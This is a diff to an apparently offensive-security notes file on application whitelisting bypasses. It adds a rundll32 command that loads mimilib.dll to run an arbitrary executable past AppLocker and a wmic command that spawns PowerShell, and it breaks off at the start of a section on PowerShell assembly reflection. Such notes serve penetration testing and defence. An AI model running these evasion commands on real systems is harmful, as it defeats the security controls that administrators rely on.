@@ -1,4 +1,10 @@
 # Application Whitelisting Bypasses
+## Random ones...
+- Bypass Applocker with mimilib.dll to run arbitrary executables:  
+  `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
+- Run PowerShell.exe via wmic.exe:   
+  `wmic.exe process call create "cmd /c powershell"` 
+  
 ## PowerShell Assembly Reflection
 ```
 # This technique can in some cases be used to bypass application whitelisting
